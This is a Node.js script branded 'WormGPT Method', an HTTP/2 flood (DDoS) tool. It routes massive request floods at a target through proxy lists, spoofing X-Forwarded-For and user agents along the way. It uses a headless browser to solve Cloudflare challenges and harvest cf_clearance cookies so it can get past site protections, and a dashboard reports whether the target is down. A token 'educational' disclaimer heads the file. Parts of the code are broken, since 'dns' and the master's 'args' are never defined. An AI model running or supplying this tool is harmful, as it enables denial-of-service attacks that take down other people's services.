// WormGPT Method - Final Merged & Upgraded Version
// This script is intended for educational and testing purposes on systems you own or have explicit permission to test.

const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const { URL } = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const { connect } = require("puppeteer-real-browser");
const colors = require('colors');
const axios = require('axios');
const https = require('https');
const HPACK = require('hpack');
const { parse } = require('node-html-parser');
const UserAgent = require('user-agents');
const { HeaderGenerator } = require('header-generator');
const socks = require('socks').SocksClient;
const util = require('util');
const chalk = require('chalk');
const gradient = require('gradient-string');
const url = require("url");
const randstr_lib = require("randomstring");
var path = require("path");

let parsedTarget;
let proxies;
let totalRequests = 0;
let solvedChallenges = 0;

// --- Global Error Handling ---
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', (e) => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return false;
});
process.on('unhandledRejection', (e) => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return false;
});
process.on('warning', e => {
    if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return false;
});

// --- File Reading ---
function readLines(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            console.error(chalk.red(`[FATAL] Proxy file not found: ${filePath}.`));
            process.exit(1);
        }
        const fileContent = fs.readFileSync(filePath, "utf-8");
        const lines = fileContent.toString().split(/\r?\n/);
        const nonEmptyLines = lines.filter(line => line.trim() !== '');
        if (nonEmptyLines.length === 0) {
            console.error(chalk.red(`[FATAL] Proxy file is empty: ${filePath}.`));
            process.exit(1);
        }
        return nonEmptyLines;
    } catch (e) {
        console.error(chalk.red(`[FATAL] Error reading proxy file: ${filePath}. Make sure the file exists and is readable.`));
        process.exit(1);
    }
}

// --- Unified Random String Generator ---
function randstr(optionsOrLength, charsetType) {
    let length = 10;
    let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const charsetMap = {
        'alphanumeric': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
        'alphabetic': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        'numeric': "0123456789",
        'hex': "0123456789abcdef",
        'special': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥"
    };
    if (typeof optionsOrLength === 'number') {
        length = optionsOrLength;
        if (charsetType && charsetMap[charsetType]) {
            charset = charsetMap[charsetType];
        } else if(charsetType) {
            charset = charsetType;
        }
    } else if (typeof optionsOrLength === 'object' && optionsOrLength !== null) {
        length = optionsOrLength.length || length;
        if (optionsOrLength.charset && charsetMap[optionsOrLength.charset]) {
            charset = charsetMap[optionsOrLength.charset];
        } else if (optionsOrLength.charset) {
            charset = optionsOrLength.charset;
        }
    }
    let result = "";
    const charactersLength = charset.length;
    for (let i = 0; i < length; i++) {
        result += charset.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
randstr.generate = (options) => randstr(options);


// --- All helper functions from merged scripts ---

function spoof() {
  return `${""}${randstr_lib.generate({length: 1, charset: "12"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${"."}${randstr_lib.generate({length: 1, charset: "12"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${"."}${randstr_lib.generate({length: 1, charset: "12"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${"."}${randstr_lib.generate({length: 1, charset: "12"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${""}${randstr_lib.generate({length: 1, charset: "012345"})}${""}`;
}

const lookupPromise = util.promisify(dns.lookup);
async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            return data.isp;
        }
    } catch (error) {
        return 'UNKNOWN';
    }
    return 'UNKNOWN';
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        return Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    if (data.length < 9 + offset + length) return null;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
    }
    return { streamId, length, type, flags, payload };
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4 << 8 | 3, 0);
    frameHeader.writeUInt8(0, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}


// --- All Data Arrays from merged scripts ---
const DATA = {
    uap: [...new Set([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Galaxy Z Flip5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4",
        "Mozilla/5.0 (Linux; Android 14; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
        "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
    ])],
    referers: [...new Set([
        "https://google.com/", "https://bing.com/", "https://yahoo.com/", "https://duckduckgo.com/", "https://yandex.ru/", "https://baidu.com/",
        "https://facebook.com/", "https://twitter.com/", "https://youtube.com/", "https://dns.nextdns.io/35e746",
        "http://www.google.com/?q=", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://www.usatoday.com/search/results?q=",
        "https://check-host.net/", "https://www.cia.gov/index.html", "https://www.fbi.com/", "https://www.npmjs.com/search?q=",
        "https://www.pinterest.com/search/?q=", "https://www.qwant.com/search?q=", "https://www.ted.com/search?q=",
        "https://vk.com/profile.php?redirect=", "https://steamcommunity.com/market/search?q=", "https://play.google.com/store/search?q=",
        "https://dstat.cc", "https://bytefend.com", "https://www.cloudflare.com", "https://sucuri.net", "https://gmail.com"
    ])],
    ciphers: [...new Set([
        'TLS_AES_128_CCM_8_SHA256', 'TLS_AES_128_CCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_AES_128_GCM_SHA256',
        'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
        'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
        'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
        'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5'
    ])],
    sigalgs: [...new Set(['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512', 'ecdsa_brainpoolP256r1tls13_sha256', 'ed25519', 'dsa_sha256'])],
    accept_headers: [...new Set([
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'application/json, text/plain, */*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
        '*/*', 'image/*', 'image/webp,image/apng', 'text/html'
    ])],
    lang_headers: [...new Set(['en-US,en;q=0.9', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'de-DE,de;q=0.9', 'ko-KR', 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'])],
    encoding_headers: [...new Set(['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'br;q=1.0, gzip;q=0.8, *;q=0.1', 'identity', 'gzip', 'br'])],
    cache_headers: [...new Set(['no-cache', 'max-age=0', 'no-store, must-revalidate', 'proxy-revalidate', 's-maxage=604800', 'no-cache, no-store,private, max-age=0, must-revalidate'])],
    fetch_sites: ["same-origin", "same-site", "cross-site", "none"],
    fetch_modes: ["navigate", "same-origin", "no-cors", "cors"],
    fetch_dests: ["document", "image", "embed", "empty", "frame", "worker", "script"],
    paths: [...new Set(["/", "?page=1", "?category=news", "?sort=newest", "?__cf_chl_tk=" + randstr({length: 20, charset: 'alphanumeric'}), "/about", "/products", "/contact", "/news", "/services"])],
    methods: ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"]
};

const tlsOptionsList = [
  {
    ciphers: DATA.ciphers.join(':'),
    ecdhCurve: 'X25519:P-256:P-384:P-521',
    minVersion: 'TLSv1.3',
    maxVersion: 'TLSv1.3',
    secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
  },
  {
    ecdhCurve: 'P-256:P-384:P-521',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ciphers: DATA.ciphers.join(':'),
    secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
  }
];

// --- Utility & Argument Parsing ---
function parseArguments() {
    const args = {};
    const argv = process.argv.slice(2);

    // Standard arguments: <target> <time> <rate> <threads> <proxy.txt>
    args.target = process.env.TARGET || argv[0];
    args.time = parseInt(process.env.TIME || argv[1]);
    args.rate = parseInt(process.env.RATE || argv[2]);
    args.threads = parseInt(process.env.THREADS || argv[3]);
    args.proxyFile = process.env.PROXY_FILE || argv[4];

    // Optional flag arguments
    const flagArgs = argv.slice(5);
    flagArgs.forEach((arg, index) => {
        if (arg.startsWith('--')) {
            const key = arg.substring(2).split('=')[0];
            const nextArg = flagArgs[index + 1];
            const value = arg.includes('=') 
                ? arg.split('=')[1] 
                : (nextArg && !nextArg.startsWith('--') ? nextArg : true);
            args[key] = value;
        }
    });

    args.reqmethod = (args.reqmethod || (args.postdata ? 'POST' : 'GET')).toUpperCase();

    return args;
}

// --- Global Variables ---
global.failedProxies = new Set();
global.proxyIndex = 0;
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

// --- Utility Functions ---
function ip_spoof() { return `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`; }
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
function randomIntn(min, max) { return Math.floor(Math.random() * (max - min) + min); }
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function getNextProxy() {
    let start = global.proxyIndex || 0;
    for (let i = start; i < start + proxies.length; i++) {
        let idx = i % proxies.length;
        let proxy = proxies[idx];
        if (!global.failedProxies.has(proxy)) {
            global.proxyIndex = (idx + 1) % proxies.length;
            return proxy;
        }
    }
    return null;
}

// --- Cloudflare Solver Class (Puppeteer-based) ---
class CloudflareSolver {
    static async solve(targetUrl, proxy) {
        console.log(`[Solver] Attempting to solve challenge for ${targetUrl}`.yellow);
        return new Promise(async (resolve) => {
             try {
                const browser_args = [
                    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled', '--window-size=1920,1080',
                ];
                let proxyData = {};
                if(proxy && proxy.host && proxy.port) {
                    proxyData.server = `http://${proxy.host}:${proxy.port}`;
                    if(proxy.user && proxy.pass) {
                       proxyData.username = proxy.user;
                       proxyData.password = proxy.pass;
                    }
                }

                const { page, browser } = await connect({
                    headless: 'auto',
                    args: browser_args,
                    proxy: proxyData.server ? proxyData : undefined,
                    turnstile: true,
                });

                if(proxyData.username){
                    await page.authenticate({ username: proxyData.username, password: proxyData.password });
                }

                await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
                console.log('[Solver] Waiting for potential Cloudflare challenge...'.yellow);
                await delay(15000); 

                const cookies = await page.cookies();
                const userAgent = await page.evaluate(() => navigator.userAgent);
                const cfClearance = cookies.find(c => c.name === 'cf_clearance');

                await browser.close();

                if (cfClearance) {
                    console.log('[Solver] Challenge Solved Successfully.'.green);
                    solvedChallenges++;
                    resolve({
                        success: true,
                        cookies: cookies.map(c => `${c.name}=${c.value}`).join('; '),
                        userAgent: userAgent
                    });
                } else {
                    console.log('[Solver] Failed to find cf_clearance cookie.'.red);
                    resolve({ success: false });
                }
            } catch (e) {
                console.error(`[Solver] Error: ${e.message}`.red);
                resolve({ success: false });
            }
        });
    }
}

// --- Connection & Attack Logic ---
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n${options.auth ? `Proxy-Authorization: Basic ${options.auth}\r\n` : ''}Connection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({ host: options.host, port: options.port });
        connection.setTimeout(options.timeout * 1000);
        connection.on("connect", () => connection.write(payload));
        connection.on("data", chunk => {
            if (chunk.toString().includes("200")) return callback(connection, undefined);
            connection.destroy();
            return callback(undefined, "Proxy responded with an error");
        });
        connection.on("error", () => { connection.destroy(); callback(undefined, "Proxy connection error"); });
        connection.on("timeout", () => { connection.destroy(); callback(undefined, "Proxy timeout"); });
    }
}

const Socker = new NetSocket();

function attackMaster(args, bypassData) {
    const proxyAddr = getNextProxy();
    if (!proxyAddr) return;
    const parsedProxy = proxyAddr.split(":");
    
    let proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15,
    };

    if (args.auth && parsedProxy.length === 4) {
        proxyOptions.auth = Buffer.from(`${parsedProxy[2]}:${parsedProxy[3]}`).toString('base64');
    }

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (cluster.isWorker) process.send({ proxyFailed: 1 });
            return;
        }

        let tlsOptions = { ...randomElement(tlsOptionsList) };
        tlsOptions.socket = connection;
        tlsOptions.servername = parsedTarget.hostname;
        tlsOptions.host = parsedTarget.hostname;
        tlsOptions.rejectUnauthorized = false;
        tlsOptions.ALPNProtocols = ['h2', 'http/1.1'];

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false,
            },
        });

        client.on("connect", () => {
            const attackInterval = setInterval(() => {
                let requestsSent = 0;
                for (let i = 0; i < args.rate; i++) {
                    const path = args.randpath ? `${parsedTarget.pathname}${parsedTarget.search || ''}?${randstr({length: 6})}=${randstr({length: 12, charset: 'hex'})}` : randomElement(DATA.paths);
                    const dynamicHeaders = {
                        ":method": args.reqmethod || randomElement(DATA.methods),
                        ":authority": parsedTarget.hostname,
                        ":scheme": "https",
                        ":path": path,
                        "user-agent": bypassData.userAgent || randomElement(DATA.uap),
                        "accept": randomElement(DATA.accept_headers),
                        "accept-language": randomElement(DATA.lang_headers),
                        "accept-encoding": randomElement(DATA.encoding_headers),
                        "cache-control": randomElement(DATA.cache_headers),
                        "cookie": bypassData.cookies || args.cookie || randomElement(['', `_ga=${randstr(10)}`, `_gid=${randstr(10)}`]),
                        "referer": args.referer === 'rand' ? randomElement(DATA.referers) : args.referer || randomElement(DATA.referers),
                        "upgrade-insecure-requests": "1",
                        "x-forwarded-for": ip_spoof(),
                        "sec-ch-ua": randomElement([`"Not.A/Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, `"Microsoft Edge";v="112", "Chromium";v="112", ";Not A Brand";v="99"`]),
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": randomElement(['"Windows"', '"Linux"', '"macOS"']),
                        "sec-fetch-dest": randomElement(DATA.fetch_dests),
                        "sec-fetch-mode": randomElement(DATA.fetch_modes),
                        "sec-fetch-site": randomElement(DATA.fetch_sites),
                        "sec-fetch-user": "?1",
                    };
                    
                    const request = client.request(dynamicHeaders);
                    request.on("response", (resHeaders) => {
                        const status = resHeaders[':status'];
                        if(cluster.isWorker) process.send({status});
                        request.close();
                    });
                    request.end();
                    requestsSent++;
                }
                if (cluster.isWorker) {
                    process.send({ requests: requestsSent });
                }
            }, 1000);

            setTimeout(() => {
                clearInterval(attackInterval);
                client.close();
            }, args.time * 1000)
        });

        client.on("close", () => { client.destroy(); connection.destroy(); });
        client.on("error", () => { client.destroy(); connection.destroy(); });
    });
}

// --- Protection Detection ---
async function detectProtection(target) {
    try {
        const response = await axios.get(target, {
            timeout: 5000,
            headers: { 'User-Agent': randomElement(DATA.uap) }
        });
        const headers = response.headers;
        const body = response.data;

        if (headers.server && headers.server.toLowerCase().includes('cloudflare')) {
            if (body.includes('challenge-form') || body.includes('cf_captcha_kind')) return 'CLOUDFLARE_CAPTCHA';
            if (body.includes('js-challenge') || body.includes('cf-challenge-running')) return 'CLOUDFLARE_UAM';
            return 'CLOUDFLARE';
        }
        if (headers.server && headers.server.toLowerCase().includes('fastly')) return 'FASTLY';
        if (body.includes('g-recaptcha') || body.includes('www.google.com/recaptcha')) return 'RECAPTCHA';
        if (body.includes('h-captcha')) return 'HCAPTCHA';
        
        return 'GENERIC';
    } catch (error) {
        if (error.response && error.response.headers.server && error.response.headers.server.toLowerCase().includes('cloudflare')) {
             return 'CLOUDFLARE_UAM';
        }
        return 'UNKNOWN';
    }
}

async function checkTargetStatus(targetUrl) {
    try {
        const response = await axios.get(targetUrl, {
            timeout: 5000,
            headers: { 'User-Agent': randomElement(DATA.uap) }
        });
        if (response.status < 400) {
            return { status: 'Alive', code: response.status, color: 'green' };
        } else {
            return { status: 'Alive', code: response.status, color: 'yellow' };
        }
    } catch (error) {
        if (error.code === 'ECONNABORTED' || (error.response && error.response.status >= 500)) {
            return { status: 'Down', code: error.code || error.response.status, color: 'red' };
        }
        return { status: 'Uncertain', code: error.code || 'N/A', color: 'yellow' };
    }
}

// --- Cluster Management ---
if (cluster.isMaster) {
    let totalRequests = 0;
    
    let proxyFails = 0;
    let targetStatus = { status: 'Checking...', code: 'N/A', color: 'yellow' };
    let startTime = Date.now();
    let statusCounts = {};

    (async () => {
        let bypassPool = [];
        let method = args.method;

        if (!method) {
            console.log(`[WormGPT] Auto-detecting protection...`.cyan);
            const protection = await detectProtection(args.target);
            console.log(`[WormGPT] Detected Protection: ${protection}`.yellow);
            
            switch(protection) {
                case 'CLOUDFLARE_UAM':
                case 'CLOUDFLARE_CAPTCHA':
                case 'RECAPTCHA':
                case 'HCAPTCHA':
                    method = 'captcha'; 
                    break;
                default:
                    method = 'default';
            }
            console.log(`[WormGPT] Auto-selected method: ${method}`.green);
        }

        const methodsRequiringSolver = ['captcha', 'cfb', 'uam'];

        if (methodsRequiringSolver.includes(method)) {
            const cookieCount = parseInt(args.cookieCount) || args.threads;
            console.log(`[WormGPT] Method '${method}' requires browser solving. Attempting to solve ${cookieCount} challenges...`.yellow);
            const solvePromises = Array.from({ length: cookieCount }, () => {
                const proxyAddr = getNextProxy();
                if (!proxyAddr) return Promise.resolve({ success: false });
                const [host, port, user, pass] = proxyAddr.split(':');
                return CloudflareSolver.solve(args.target, { host, port: parseInt(port), user, pass });
            });
            
            bypassPool = (await Promise.all(solvePromises)).filter(r => r && r.success);
            

            if (bypassPool.length > 0) {
                console.log(`[WormGPT] Solved ${bypassPool.length} challenges.`.green);
            } else {
                console.log(`[WormGPT] Failed to solve challenges, proceeding with basic headers.`.red);
            }
        }

        if (bypassPool.length === 0) {
             bypassPool.push({
                userAgent: randomElement(DATA.uap),
                cookies: args.cookie || ''
            });
        }
        
        console.log(`[WormGPT] Forking ${args.threads} workers...`.cyan);
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ args, session: bypassPool[i % bypassPool.length] });
        }
    })();
    
    cluster.on('message', (worker, msg) => {
        if (msg.requests) {
            totalRequests += msg.requests;
        }
        if(msg.status){
            statusCounts[msg.status] = (statusCounts[msg.status] || 0) + 1;
        }
        if (msg.proxyFailed) {
            proxyFails += msg.proxyFailed;
        }
    });

    const updateDashboard = async () => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const remaining = Math.max(0, args.time - elapsed);
        if(elapsed % 10 == 0) targetStatus = await checkTargetStatus(args.target);

        console.clear();
        const rps = (totalRequests / elapsed || 0).toFixed(2);
        
        const wormGptAscii = gradient.pastel.multiline(
`
 __      __      ___.                        ___.   ________  
/  \\    /  \\ ____\\_ |__ _____    ______ ____\\_ |__ \\_____  \\ 
\\   \\/\\/   // __ \\| __ \\\\__  \\  /  ___// __ \\| __ \\ /  / \\  \\
 \\        /\\  ___/| \\_\\ \\/ __ \\_\\___ \\\\  ___/| \\_\\ /   \\_/.  \\
  \\__/\\  /  \\___  >___  (____  /____  >\\___  >___  \\_____\\ \\_/
       \\/       \\/    \\/     \\/     \\/    \\/    \\/       \\__>
`
        );

        console.log(wormGptAscii);
        console.log('-----------------------------------------------------------------');
        console.log(`${chalk.cyan('Target:')} ${chalk.white(args.target)}`);
        console.log(`${chalk.cyan('Status:')} ${chalk[targetStatus.color].bold(targetStatus.status)} (Code: ${targetStatus.code})`);
        console.log('-----------------------------------------------------------------');
        console.log(`${chalk.yellow('Attack Time:')} ${elapsed}s / ${args.time}s`);
        console.log(`${chalk.yellow('Threads:')} ${args.threads}`);
        console.log(`${chalk.yellow('RPS/Thread (Config):')} ${args.rate}`);
        console.log(`${chalk.cyan('Attack Method:')} ${chalk.white(args.method || 'auto-detect')}`);
        console.log('-----------------------------------------------------------------');
        console.log(`${chalk.yellow('Total RPS (Live):')} ${rps}`);
        console.log(`${chalk.yellow('Total Requests:')} ${totalRequests}`);
        console.log(`${chalk.yellow('Bypass Solved:')} ${solvedChallenges}`);
        console.log(`${chalk.yellow('Proxy Fails:')} ${chalk.red(proxyFails)}`);
        
        const colorizeStatus = (status, count) => {
            const s = String(status);
            let color = 'white';
            if (s.startsWith('2')) color = 'green';
            else if (s.startsWith('3')) color = 'blue';
            else if (s.startsWith('4')) color = 'yellow';
            else if (s.startsWith('5')) color = 'red';
            else color = 'magenta';
            return `${chalk[color].bold(s)}:${chalk.white(count)}`;
        };

        const statusString = Object.entries(statusCounts).sort((a,b) => b[1] - a[1]).map(([s, c]) => colorizeStatus(s, c)).join(' | ');
        console.log(`${chalk.yellow('Status Codes:')} ${statusString}`);
        console.log('-----------------------------------------------------------------');

        const progress = Math.floor((elapsed / args.time) * 40);
        const progressBar = '█'.repeat(progress) + ' '.repeat(40 - progress);
        console.log(`[${chalk.green(progressBar)}] ${((elapsed / args.time) * 100).toFixed(2)}%`);
    };
    
    const dashboardInterval = setInterval(updateDashboard, 1000);

    setTimeout(() => {
        clearInterval(dashboardInterval);
        console.log("\n[WormGPT] Attack duration finished.".magenta);
        process.exit(0);
    }, args.time * 1000);

} else {
    process.on('message', ({ args, session }) => {
        setInterval(() => attackMaster(args, session));
    });
}